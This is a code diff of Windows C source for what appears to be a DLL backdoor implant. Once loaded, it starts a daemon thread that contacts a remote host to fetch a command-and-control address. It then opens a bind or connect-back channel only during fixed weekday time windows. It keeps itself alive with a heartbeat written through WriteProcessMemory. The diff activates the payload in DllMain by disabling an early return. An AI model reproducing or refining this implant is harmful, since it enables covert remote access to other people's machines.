@@ -23,10 +23,9 @@ DWORD WINAPI BindThread( LPVOID lpParam ) {
   DWORD dwThreadID;
   DWORD ret ;
   int split ;
-  PRINTF( "bind to %s\n" , ( char* )lpParam ) ;
   memcpy( ip , ( char* )lpParam , 15 ) ;
-  memcpy( ip , "192.168.003.152" , 15 ) ;
   memcpy( port , ( char* )lpParam + 16 , 5 ) ;
+  PRINTF( "bind to %s\n" , ( char* )lpParam ) ;
   for( ; ; ) {
     srand( ( unsigned )time( NULL ) ) ;
     split = rand( ) % BIND_SPLIT_RANDOM_RANGE + BIND_SPLIT_RANDOM_BASE ;
@@ -149,7 +148,6 @@ BOOLEAN CheckLocalTime( ) {
   BOOLEAN rc = FALSE ;
   SYSTEMTIME lt ;
   GetLocalTime( &lt ) ;
-#ifdef _DEBUG_
   PRINTF( "%d-%d-%d %d:%d:%d %d\n" ,
           lt.wYear ,
           lt.wMonth ,
@@ -159,7 +157,6 @@ BOOLEAN CheckLocalTime( ) {
           lt.wSecond ,
           lt.wDayOfWeek // 0 to 6 means Sunday to Saturday
     ) ;
-#endif
   if( 1 == lt.wDayOfWeek &&  8 == lt.wHour && 30 <= lt.wMinute && 40 >= lt.wMinute ) rc = TRUE ;
   if( 2 == lt.wDayOfWeek &&  9 == lt.wHour && 20 <= lt.wMinute && 35 >= lt.wMinute ) rc = TRUE ;
   if( 3 == lt.wDayOfWeek && 10 == lt.wHour && 15 <= lt.wMinute && 25 >= lt.wMinute ) rc = TRUE ;
@@ -204,42 +201,32 @@ void GetCCInfo( char* address ) {
   PRINTF( "wait %d then send get request\n" , split ) ;
   Sleep( split * 1000 ) ;
   iResult = WSAStartup( MAKEWORD( 2 , 2 ) , &wsaData ) ;
-#ifdef _DEBUG_
   if( NO_ERROR != iResult ) {
     PRINTF( "WSAStartup error : %d\n" , iResult ) ;
     return 1 ;
   } // end of if( NO_ERROR != iResult )
-#endif
   ConnectSocket = socket( AF_INET , SOCK_STREAM , IPPROTO_TCP ) ;
-#ifdef _DEBUG_
   if( INVALID_SOCKET == ConnectSocket ) {
     PRINTF( "socket error : %ld\n" , WSAGetLastError( ) ) ;
     WSACleanup( ) ;
     return 1 ;
   } // end of if( INVALID_SOCKET == ConnectSocket )
-#endif
   remoteHost = gethostbyname( HOSTNAME ) ;
-#ifdef _DEBUG_
   if( NULL == remoteHost ) {
     PRINTF( "[-] remoteHost : %p\n" , remoteHost ) ;
   }
   else {
-#endif
     i = 0 ;
     if( remoteHost->h_addrtype == AF_INET ) {
       while( remoteHost->h_addr_list[i] != 0 ) {
         addr.s_addr = *(u_long *)remoteHost->h_addr_list[i++] ;
-#ifdef _DEBUG_
         PRINTF( "IP Address #%d : %s\n" , i , inet_ntoa( addr ) ) ;
-#endif
       }
     }
-#ifdef _DEBUG_
     else {
       PRINTF( "[-] remoteHost->h_addrtype == AF_INET" ) ;
     }
   }
-#endif
   clientService.sin_family = AF_INET ;
   clientService.sin_addr.s_addr = addr.s_addr ;
   clientService.sin_port = htons( DEFAULT_PORT ) ;
@@ -248,28 +235,24 @@ void GetCCInfo( char* address ) {
     ( SOCKADDR* )&clientService , 
     sizeof( clientService ) 
     ) ;
-#ifdef _DEBUG_
   if( SOCKET_ERROR == iResult ) {
     PRINTF( "[-] connect : %d\n" , WSAGetLastError( ) ) ;
     closesocket( ConnectSocket ) ;
     WSACleanup( ) ;
     return 1 ;
   } // end of if( SOCKET_ERROR == iResult )
-#endif
   iResult = send( 
     ConnectSocket , 
     CONTEXT ,
     sizeof( CONTEXT ) ,
     0
     ) ;
-#ifdef _DEBUG_
   if( SOCKET_ERROR == iResult ) {
     PRINTF( "[-] send : %d\n" , WSAGetLastError( ) ) ;
     closesocket( ConnectSocket ) ;
     WSACleanup( ) ;
     return 1 ;  
   } // end of if( SOCKET_ERROR == iResult )
-#endif
   memset( buff_inner , 0 , DEFAULT_BUFLEN + 1 ) ;
   memset( buff_inner_last , 0 , DEFAULT_BUFLEN + 1 ) ;
   memset( addr_inner , 0 , DEFAULT_BUFLEN * 3 ) ;
@@ -323,23 +306,41 @@ void GetCCInfo( char* address ) {
     }
   } while( iResult > 0 ) ;
   iResult = closesocket( ConnectSocket ) ;
-#ifdef _DEBUG_
   if( SOCKET_ERROR == iResult ) {
     PRINTF( "[-] closesocket : %d\n" , WSAGetLastError( ) ) ;
     closesocket( ConnectSocket ) ;
     WSACleanup( ) ;
     return 1 ;  
   } // end of if( SOCKET_ERROR == iResult )
-#endif
   memcpy( address , strstr( addr_inner , "wassup" ) + 6 , 21 ) ;
   PRINTF( "address : %s\n" , address ) ;
 }
 
 BOOLEAN CheckAddress( char* address ) {
   BOOLEAN rc = TRUE ;
-  if( '.' == address[0] && '.' == address[1] && '.' == address[2] )
+  char buf[16] ; // xxx.xxx.xxx.xxx\0
+  memset( buf , 0 , 16 ) ;
+  memcpy( buf , address , 15 ) ;
+  if( NULL == address ) {
     rc = FALSE ;
-  PRINTF( "rc of CheckAddress : %d\n" , rc ) ;
+    PRINTF( "rc of CheckAddress : %d on null\n" , rc ) ;
+    return rc ;
+  }
+  if( 0 == strcmp( "" , address ) ) {
+    rc = FALSE ;
+    PRINTF( "rc of CheckAddress : %d on \"\"\n" , rc ) ;
+    return rc ;
+  }
+  if( '.' == address[0] && '.' == address[1] && '.' == address[2] ) {
+    rc = FALSE ;
+    PRINTF( "rc of CheckAddress : [%s] %d\n" , address , rc ) ;
+    return rc ;
+  }
+  if( 1 == inet_pton( AF_INET , buf , NULL ) ) {
+    rc = FALSE ;
+    PRINTF( "rc of CheckAddress : [%s] %d\n" , buf , rc ) ;
+    return rc ;
+  }
   return rc ;
 }
 
@@ -377,15 +378,19 @@ DWORD WINAPI DaemonThread( LPVOID lpParam ) {
           } // end of if( !hBindThread )
         } // end of if( CheckAddress( &address ) )
         else {
+          if( !hBindThread ) {
+            TerminateThread( hBindThread , 0 ) ;
+            CloseHandle( hBindThread ) ;
+            hBindThread = NULL ;
+          }
+        }
+      } // end of if( CheckLocalTime( ) )
+      else {
+        if( !hBindThread ) {
           TerminateThread( hBindThread , 0 ) ;
           CloseHandle( hBindThread ) ;
           hBindThread = NULL ;
         }
-      } // end of if( CheckLocalTime( ) )
-      else {
-        TerminateThread( hBindThread , 0 ) ;
-        CloseHandle( hBindThread ) ;
-        hBindThread = NULL ;
       }
       Sleep( CHECK_LOCAL_TIME_SPLIT * 1000 ) ;
     } // end of for( ; ; )
@@ -402,9 +407,7 @@ DWORD WINAPI HeartBeatThread( LPVOID lpParam ) {
   hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, dwPID);
   timeStamp = ( long* )WriteConsoleInput ;
   for( ; ; ) {
-#ifdef _DEBUG_
-    PRINTF( "[%d] heart beating timeStamp %ld\r\n" , dwTID , *timeStamp ) ;
-#endif
+//    PRINTF( "[%d] heart beating timeStamp %ld\r\n" , dwTID , *timeStamp ) ;
     timeStamp_new = *timeStamp ;
     timeStamp_new ++ ;
     WriteProcessMemory( 
@@ -430,14 +433,10 @@ BOOL CheckHeartBeat( ) {
   hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, dwPID);
   timeStamp = ( long* )WriteConsoleInput ;
   timeStamp_old = *timeStamp ;
-#ifdef _DEBUG_
   PRINTF( "[%d] check timeStamp_old %ld\r\n" , dwTID , timeStamp_old ) ;
-#endif
   Sleep( ( HEART_BEAT_SPLIT + 1 ) * 1000 ) ;
   timeStamp_new = *timeStamp ;
-#ifdef _DEBUG_
   PRINTF( "[%d] check timeStamp_new %ld\r\n" , dwTID , timeStamp_new ) ;
-#endif
   rc = timeStamp_old == timeStamp_new ? FALSE : TRUE ;
   return rc ;
 }
@@ -449,10 +448,10 @@ BOOL WINAPI DllMain(
   ) {
   DWORD dwDaemonThreadId ;
   HANDLE hDaemonThread ;
-  PRINTF( "wassup" ) ;
-  return TRUE ;
   switch( fdwReason ) {
   case DLL_PROCESS_ATTACH :
+  /* PRINTF( "wassup" ) ; */
+  /* return TRUE ; */
     hDaemonThread = CreateThread(
       NULL ,
       0 ,
